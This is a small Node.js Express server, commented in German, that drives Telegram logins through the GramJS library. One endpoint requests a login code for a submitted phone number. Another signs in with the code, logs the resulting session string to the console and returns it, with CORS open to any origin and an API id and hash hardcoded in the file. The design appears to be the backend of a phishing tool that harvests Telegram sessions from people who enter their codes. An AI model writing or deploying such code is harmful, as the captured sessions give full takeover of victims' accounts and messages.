const express = require('express');
const cors = require('cors');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
app.use(cors());
app.use(express.json());

// Speichert temporäre Clients
const clients = new Map();

// Deine API Daten
const apiId = 23049703; 
const apiHash = 'e9c00af578a9de0253ef02337460498f';

app.post('/send-code', async (req, res) => {
    const { phone } = req.body;
    const client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 5 });
    
    try {
        await client.connect();
        const phoneCodeHash = await client.sendCode({ apiId, apiHash }, phone);
        clients.set(phone, { client, phoneCodeHash });
        res.json({ success: true, phoneCodeHash: phoneCodeHash.phoneCodeHash });
    } catch (e) {
        res.status(400).json({ error: e.message });
    }
});

app.post('/verify-code', async (req, res) => {
    const { phone, code, phoneCodeHash } = req.body;
    const sessionData = clients.get(phone);

    if (!sessionData) return res.status(400).json({ error: 'Session abgelaufen' });

    try {
        const result = await sessionData.client.signIn({
            apiId,
            apiHash,
            phoneNumber: phone,
            phoneCode: code,
            phoneCodeHash: phoneCodeHash
        });

        // Hier wird die Session gesichert
        const sessionString = sessionData.client.session.save();
        console.log("SESSION ERHALTEN:", sessionString);
        
        res.json({ success: true, session: sessionString });
        clients.delete(phone);
    } catch (e) {
        res.status(400).json({ error: e.message });
    }
});

app.listen(3000, () => console.log('Server läuft auf Port 3000'));
